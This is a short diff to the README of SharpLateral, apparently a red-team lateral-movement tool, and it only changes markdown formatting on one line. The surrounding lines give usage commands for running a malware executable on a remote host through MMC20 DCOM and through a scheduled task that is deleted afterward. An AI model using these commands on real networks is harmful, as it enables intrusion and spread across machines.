@@ -22,7 +22,7 @@ SharpLateral aims to perform lateral movement with the following methods:<br>
 
   <br>DCOM:<br>
 ``SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe``<br>
-````Executes Malware on given hostname via MMC20````
+Executes Malware on given hostname via MMC20
  <br>Scheduled Task:<br>
 ``SharpLateral schedule C:\Users\Administrator\Desktop\malware.exe TaskName``<br>
 Creates Task,Executes Malware,Deletes Task<br>
